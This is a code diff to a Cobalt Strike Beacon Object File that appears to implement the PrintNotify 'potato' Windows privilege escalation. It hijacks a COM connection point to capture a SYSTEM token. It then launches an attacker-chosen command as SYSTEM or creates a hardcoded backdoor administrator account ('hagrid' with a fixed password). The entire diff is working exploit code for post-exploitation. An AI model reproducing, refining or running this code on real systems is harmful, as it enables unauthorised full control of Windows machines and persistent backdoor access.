@@ -6,12 +6,12 @@
 
 #include "bofdefs.h"
 
-
-#pragma comment (lib, "comdef.lib");
 #define UNLEN 256
 
-HANDLE hToken_SYSMTE = nullptr;
+#define HANDLETOU(h) ((unsigned long)(ULONG_PTR)(h))
+#define UTOHANDLE(h) ((void*)(UINT_PTR)(h))
 
+DWORD token_value __attribute__((section (".data"))) = 0;
 
 // Borrow from JuicyPotatoNG
 bool IsTokenSystem(HANDLE hToken)
@@ -113,10 +113,10 @@ typedef struct {
 
 // Borrow from https://github.com/rapid7/metasploit-framework/blob/master/external/source/exploits/ntapphelpcachecontrol/exploit/CaptureImpersonationToken.cpp
 HRESULT STDMETHODCALLTYPE QueryInterface(IUnknown* This, REFIID riid, void** ppvObj) {
-	hToken_SYSMTE = nullptr;
+	HANDLE hToken_SYSMTE = UTOHANDLE(token_value);
 	HANDLE* m_ptoken = &hToken_SYSMTE;
-	
-	if (*m_ptoken == nullptr)
+
+	if (*m_ptoken == NULL)
 	{
 		HRESULT hr = OLE32$CoImpersonateClient();
 		if (SUCCEEDED(hr))
@@ -130,7 +130,6 @@ HRESULT STDMETHODCALLTYPE QueryInterface(IUnknown* This, REFIID riid, void** ppv
 				ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, dwLength, &dwLength);
 				if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER)
 				{
-					
 					user = (PTOKEN_USER)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
 					if (user == NULL)
 					{
@@ -138,15 +137,16 @@ HRESULT STDMETHODCALLTYPE QueryInterface(IUnknown* This, REFIID riid, void** ppv
 						return NULL;
 					}
 				}
-				
-				if((*m_ptoken == nullptr))
+
+				if((*m_ptoken == NULL))
 				{
 					*m_ptoken = hToken;
+					token_value = HANDLETOU(*m_ptoken);
 				}
 				else
 				{
 					KERNEL32$CloseHandle(hToken);
-				}				
+				}
 			}
 			else
 			{
@@ -223,137 +223,158 @@ bool CreateAdminUser()
 	return true;
 }
 
-
-void go(char* args, int alen)
+BOOL InitBackup()
 {
+	HANDLE hTokenCurrProc = NULL;
+	BOOL flag = TRUE;
 
-	wchar_t* wProcessPath = NULL;
-	wchar_t* wCommandLine = NULL;
-	size_t wideSize = 0;
-	size_t wideSize2 = 0;
-
-	datap parser;
-	BeaconDataParse(&parser, args, alen);
-	char* processPath = BeaconDataExtract(&parser, NULL);
-	char* commandLine = BeaconDataExtract(&parser, NULL);
-	size_t method = BeaconDataInt(&parser);
-
-	if(method != 3)
-		BeaconPrintf(CALLBACK_OUTPUT, "Process Path = %s\nCommand Line = %s\n", processPath, commandLine);
-
-	size_t convertedChars = 0;
-	wideSize = MSVCRT$strlen(processPath) + 1;
-	wProcessPath = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
-	MSVCRT$mbstowcs_s(&convertedChars, wProcessPath, wideSize, processPath, _TRUNCATE);
-
-	size_t convertedChars2 = 0;
-	wideSize2 = MSVCRT$strlen(commandLine) + 1;
-	wCommandLine = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
-	MSVCRT$mbstowcs_s(&convertedChars2, wCommandLine, wideSize2, commandLine, _TRUNCATE);
-
-	HANDLE hTokenCurrProc;
 	ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrProc);
 	if(!EnablePriv(hTokenCurrProc, SE_IMPERSONATE_NAME)) {
 		BeaconPrintf(CALLBACK_ERROR, "SeImpersonatePrivilege properly not held\n");
-		goto cleanup;
+		flag = FALSE;
+		goto _CleanUp;
 	}
 
-	HRESULT hr = OLE32$CoInitialize(NULL);
+
+_CleanUp:
+	KERNEL32$CloseHandle(hTokenCurrProc);
+	return flag;
+
+}
+
+
+BOOL EnumConectPoint()
+{
+	BOOL flag = TRUE;
 	bool backupInit = false;
-	if (FAILED(hr)) {
-		BeaconPrintf(CALLBACK_ERROR, "CoInitialize fail, Error: 0x%08lx\n", hr);
-		if (BeaconIsAdmin()) {
-			BeaconPrintf(CALLBACK_OUTPUT, "Attempt to initialize with CoInitializeEx alternatively\n");
-			hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
-			if (FAILED(hr)) {
-				BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx fail, Error: 0x%08lx\n", hr);
-			}
-			bool backupInit = true;
-		}
-	}
-	
-	if (!backupInit) {
-		hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
-		if (hr != S_OK)
-		{
-			BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity fail, Error: 0x%08lx\n", hr);
-			goto cleanup;
-		}
-	}
-	
-	HANDLE hTokenLogon = NULL;
-	
-	//add the INTERACTIVE sid ref: https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/
-	//https://stackoverflow.com/questions/5023607/how-to-use-logonuser-properly-to-impersonate-domain-user-from-workgroup-client
-	if (!ADVAPI32$LogonUserA("X", "X", "X", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTokenLogon) || !BeaconUseToken(hTokenLogon))
-	{
-		BeaconPrintf(CALLBACK_ERROR, "LogonUser and impersonate failed: %d\n", KERNEL32$GetLastError());
-		goto cleanup;
-	}
+	ULONG num = 1;
+	HRESULT hr = 0;
+	ULONG d = 0;
+	IConnectionPoint* arr;
 
 	CLSID CLSID_PrintNotifyService;
 	CLSID CLSID_IUnknown;
 	wchar_t* szCLSID_PrintNotifyService = L"{854A20FB-2D44-457D-992F-EF13785D2B51}";
 	wchar_t* szCLSID_IUnknown = L"{00000000-0000-0000-C000-000000000046}";
+	IUnknown* pUnkown = NULL;
+
+        IConnectionPointContainer* svc = NULL;
+	CLSID CLSID_IConnectionPointContainer;
+	wchar_t* szCLSID_IConnectionPointContainer = L"{B196B284-BAB4-101A-B69C-00AA00341D07}";
+	IEnumConnectionPoints* pEnumConnectionPoints;
+        IExample* example;
+	IExampleVtbl IExample_Vtbl;
+
+        hr = OLE32$CoInitialize(NULL);
+        if (FAILED(hr)) {
+                BeaconPrintf(CALLBACK_ERROR, "CoInitialize fail, Error: 0x%08lx\n", hr);
+                if (BeaconIsAdmin()) {
+                        BeaconPrintf(CALLBACK_OUTPUT, "Attempt to initialize with CoInitializeEx alternatively\n");
+                        hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
+                        if (FAILED(hr)) {
+                                BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx fail, Error: 0x%08lx\n", hr);
+                        }
+                        backupInit = true;
+                }
+        }
+
+        if (!backupInit) {
+                hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
+                if (hr != S_OK)
+                {
+                        BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity fail, Error: 0x%08lx\n", hr);
+                        flag = FALSE;
+                        goto _CleanUp;
+                }
+        }
+
 	OLE32$CLSIDFromString(szCLSID_PrintNotifyService, &CLSID_PrintNotifyService);
 	OLE32$CLSIDFromString(szCLSID_IUnknown, &CLSID_IUnknown);
 
-	IUnknown* pUnkown = NULL;
 	hr = OLE32$CoCreateInstance(CLSID_PrintNotifyService, NULL, 4, CLSID_IUnknown, (void**)&pUnkown);
 	if (hr != S_OK)
 	{
 		BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance fail, Error: 0x%08lx\n", hr);
-		goto cleanup;
+		flag = FALSE;
+		goto _CleanUp;
 	}
 
-	IConnectionPointContainer* svc = NULL;
-	CLSID CLSID_IConnectionPointContainer;
-	wchar_t* szCLSID_IConnectionPointContainer = L"{B196B284-BAB4-101A-B69C-00AA00341D07}";
 	OLE32$CLSIDFromString(szCLSID_IConnectionPointContainer, &CLSID_IConnectionPointContainer);
 	hr = pUnkown->QueryInterface(CLSID_IConnectionPointContainer, (LPVOID*)&svc);
 	if (hr != S_OK)
 	{
 		BeaconPrintf(CALLBACK_ERROR, "QueryInterface fail, Error: 0x%08lx\n", hr);
-		goto cleanup;
+		flag = FALSE;
+		goto _CleanUp;
 	}
 
-	IEnumConnectionPoints* pEnumConnectionPoints;
 	hr = svc->EnumConnectionPoints(&pEnumConnectionPoints);
 	if (hr != S_OK)
 	{
 		BeaconPrintf(CALLBACK_ERROR, "EnumConnectionPoints fail, Error: 0x%08lx\n", hr);
-		goto cleanup;
+		flag = FALSE;
+		goto _CleanUp;
 	}
 	svc->Release();
 
-	ULONG num = 1;
-	hr = 0;
-	ULONG d = 0;
-	IConnectionPoint* arr;
 	hr = pEnumConnectionPoints->Next(num, &arr, (ULONG*)(&d));
 
 	if (hr != S_OK)
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Next fail, Error: 0x%08lx\n", hr);
-		goto cleanup;
+		flag = FALSE;
+		goto _CleanUp;
 	}
 
-	IExample* example;
 	example = (IExample*)KERNEL32$GlobalAlloc(GMEM_FIXED, sizeof(IExample));
-	IExampleVtbl IExample_Vtbl = { QueryInterface, AddRef, Release };
+	IExample_Vtbl = { QueryInterface, AddRef, Release };
 	example->lpVtbl = &IExample_Vtbl;
 	do {
-		if (arr != nullptr)
+		if (arr != NULL)
 		{
 			arr->Advise((IUnknown*)example, &d);
 			break;
 		}
 		hr = pEnumConnectionPoints->Next(num, &arr, (ULONG*)(&d));
 	} while (hr == 0);
-	
+
+	goto _CleanUp;
+
+_CleanUp:
+	OLE32$CoUninitialize();
+	return flag;
+}
+
+
+VOID GetHigh(wchar_t* wProcessPath, wchar_t* wCommandLine, int method)
+{
+	if(!InitBackup())
+	{
+		return;
+	}
+
+	HANDLE hTokenLogon = NULL;
+
+	//add the INTERACTIVE sid ref: https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/
+	//https://stackoverflow.com/questions/5023607/how-to-use-logonuser-properly-to-impersonate-domain-user-from-workgroup-client
+	if (!ADVAPI32$LogonUserA("X", "X", "X", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTokenLogon) || !BeaconUseToken(hTokenLogon))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "LogonUser and impersonate failed: %d\n", KERNEL32$GetLastError());
+		KERNEL32$CloseHandle(hTokenLogon);
+		return;
+	}
+
+	if(!EnumConectPoint())
+	{
+		return;
+	}
+
+        HANDLE hToken_SYSMTE = UTOHANDLE(token_value);
+
 	if (!IsTokenSystem(hToken_SYSMTE)) {
 		BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SYSTEM token with proper impersonate level!");
-		goto cleanup;
+		KERNEL32$CloseHandle(hToken_SYSMTE);
+		return;
 	}
 
 	SECURITY_ATTRIBUTES sa;
@@ -364,7 +385,6 @@ void go(char* args, int alen)
 	PROCESS_INFORMATION processInfo = { 0 };
 	startupInfo.cb = sizeof(startupInfo);
 
-	
 	if (method == 2) {
 		//According to document, the process that calls the CreateProcessAsUser function must have the SE_INCREASE_QUOTA_NAME privilege and may require the SE_ASSIGNPRIMARYTOKEN_NAME privilege if the token is not assignable.
 		EnablePriv(hToken_SYSMTE, SE_INCREASE_QUOTA_NAME);
@@ -372,7 +392,8 @@ void go(char* args, int alen)
 		BeaconUseToken(hToken_SYSMTE);
 		if (!ADVAPI32$CreateProcessAsUserW(hToken_SYSMTE, wProcessPath, wCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
 			BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUserW failed: %d\n", KERNEL32$GetLastError());
-			goto cleanup;
+			KERNEL32$CloseHandle(hToken_SYSMTE);
+			return;
 		}
 		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessAsUserW successfully\n");
 	}
@@ -382,23 +403,44 @@ void go(char* args, int alen)
 			BeaconPrintf(CALLBACK_OUTPUT, "User hagrid with password P@ss@29hagr!d has been added into administrators");
 		}
 		else {
-			goto cleanup;
+			BeaconRevertToken();
+			KERNEL32$CloseHandle(hToken_SYSMTE);
+			return;
 		}
 	}
 	else{
 		if (!ADVAPI32$CreateProcessWithTokenW(hToken_SYSMTE, 0, wProcessPath, wCommandLine, CREATE_NO_WINDOW, 0, NULL, &startupInfo, &processInfo)) {
 			BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW failed: %d\n", KERNEL32$GetLastError());
-			goto cleanup;
+			KERNEL32$CloseHandle(hToken_SYSMTE);
+			return;
 		}
 		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessWithTokenW successfully\n");
 	}
 
-
-cleanup:
-	BeaconRevertToken();
-	OLE32$CoUninitialize();
-	KERNEL32$CloseHandle(hTokenCurrProc);
 	KERNEL32$CloseHandle(hToken_SYSMTE);
-	KERNEL32$CloseHandle(hTokenLogon);
-	return;
+
+
+
+}
+
+
+void go(char* args, int alen)
+{
+
+	wchar_t * wProcessPath = NULL;
+	wchar_t * wCommandLine = NULL;
+
+	int method = 0;
+
+	datap parser;
+	BeaconDataParse(&parser, args, alen);
+	wProcessPath = (wchar_t*)BeaconDataExtract(&parser, NULL);
+	wCommandLine = (wchar_t*)BeaconDataExtract(&parser, NULL);
+	method = BeaconDataInt(&parser);
+
+	if(method != 3) {
+		BeaconPrintf(CALLBACK_OUTPUT, "Process Path = %ls\nCommand Line = %ls\n", wProcessPath, wCommandLine);
+	}
+
+	GetHigh(wProcessPath, wCommandLine, method);
 }
